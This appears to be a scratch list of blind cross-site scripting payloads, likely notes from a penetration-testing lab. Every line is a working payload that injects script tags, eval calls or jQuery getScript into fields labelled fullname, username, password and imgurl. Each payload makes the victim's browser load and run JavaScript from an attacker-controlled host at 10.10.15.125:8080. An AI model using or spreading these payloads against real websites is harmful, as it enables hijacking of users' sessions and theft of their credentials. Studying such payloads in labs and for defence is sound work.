...
```
'><script src=http://10.10.15.125:8080/fullname></script>
'><script src=http://10.10.15.125:8080/username></script>
"><script src=http://10.10.15.125:8080/password></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.15.125:8080\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.15.125:8080");a.send();</script>
<script>$.getScript("http://10.10.15.125:8080")</script>
```

'><script src=http://10.10.15.125:8080/imgurl></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.15.125:8080\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.15.125:8080");a.send();</script>
<script>$.getScript("http://10.10.15.125:8080")</script>

```javascript
"><script src=http://10.10.15.125:8080/script.js></script>
```
